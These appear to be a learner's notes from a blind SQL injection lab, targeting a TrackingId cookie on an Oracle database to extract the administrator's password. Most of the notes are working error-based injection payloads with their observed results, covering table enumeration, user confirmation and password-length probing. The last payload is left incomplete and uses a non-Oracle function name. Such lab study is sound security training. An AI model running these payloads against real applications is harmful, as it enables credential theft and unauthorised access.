- Blind SQLi - Tracking Id cookie

- The result of the SQL query are not returned and the application
does not respond any differently based on whether the query
returns any row.

- DB -> users table > username, password columns.

Goal:
1- Enumerate over the password of administrator.
2- Login as the administrator user.


Process:

TrackingId=3razirNdal2rG3Ye' -> internal Error.
TrackingId=3razirNdal2rG3Ye'' -> No error, that means there's a SQLi here.

' and 1=1-- -> No error
' and 1=2-- -> No error, no different behaviour.

that means I cannot trigger boolean conditions, because the application does not respond differently when dealing 
with series of True/False conditions.

So, I will try to make the app to trigger SQL Erros based on some condition

' || (select '') || ' -> Error, so maybe because the dbms is something else, so i'll try Oracle.

In oracle every select statement must be followed by FROM clause
so i'll use built-in table called dual


' || (select '' from dual ) || ' -> No error.

dbms: oracle.

Prove that there's users table in the db:
' || (select '' from users where rownum=1 ) || ' -> No Error
I used rownum here to limit only the incoming row to ignore Errors
that may arise.

Prove that administrator user exist in users table

' || (select '' from users where username = 'administrator') || ' -> No error, administrator user exist

triggering some SQL Erros based on some condition
CASE expression from Oracle: https://docs.oracle.com/cd/B19306_01/server.102/b14200/expressions004.htm

' || (select CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> NO error cuz the condition is False.
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' -> error cuz the condition is True.


' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator') || ' -> Error cuz the username exist
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'something') || ' -> no Error cuz the username does not exist.

Get the length of the password:

' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and LENGTH(password) > 1) || ' -> Error cuz the username exist

I fired the intruder to check the length of the password and got 200 ok at the number 20 > length = 20.


Enumerate over the password one at a time:
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username = 'administrator' and substring(password, 1, 1) || ' ->



now, try to automate this.
